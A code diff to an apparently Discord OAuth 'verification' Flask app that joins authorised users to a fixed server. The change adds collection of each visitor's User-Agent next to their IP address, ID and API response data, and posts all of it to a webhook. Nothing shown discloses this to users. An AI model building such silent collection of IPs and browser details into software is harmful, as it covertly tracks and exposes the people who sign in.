@@ -58,7 +58,7 @@ def exchange_code(code):
     return False
 
 
-def add_to_guild(access_token, userID, guild_Id, ip):
+def add_to_guild(access_token, userID, guild_Id, ip, ua):
   url = f"{API_ENDPOINT}/guilds/{guild_Id}/members/{userID}"
 
   botToken = tkn
@@ -77,7 +77,7 @@ def add_to_guild(access_token, userID, guild_Id, ip):
   # print(response.text)
   # print(response.status_code)
   # print(REDIRECT_URI)
-  content = f">>> new user authed\n\nID: {userID}\nMention:<@{userID}>\nIP: {ip}\n\nData: {rjson}"
+  content = f">>> new user authed\n\nID: `{userID}`\nMention:<@{userID}>\nIP: `{ip}`\nUserAgent: `{ua}`\n\nData: `{rjson}`"
   r = requests.post(
   hook, json={ "content": content })
   r = requests.put(
@@ -293,6 +293,7 @@ def check():
 
 # @app.route("/myip", methods=["GET"])
 # def get_my_ip():
+#   return 
 #   ip = request.environ['HTTP_X_FORWARDED_FOR']
 #   ip = ip.split(',')[0]
 #   return ip
@@ -315,6 +316,10 @@ def process_json():
     ip = ip.split(',')[0]
   except:
     ip = None
+  try:
+    ua = request.headers.get('User-Agent')
+  except:
+    ua = None
   args = request.args
   if "code" not in args:
     return redirect(verifier_redir, code=302)
@@ -339,7 +344,7 @@ def process_json():
   except:
     return redirect("https://discord.com/oauth2/authorized", code=302)
   try:
-    add_to_guild(str(access_tk), str(id), "952495772073619466", ip)
+    add_to_guild(str(access_tk), str(id), "952495772073619466", ip, ua)
   except:
     pass
   return redirect("https://discord.com/oauth2/authorized", code=302)
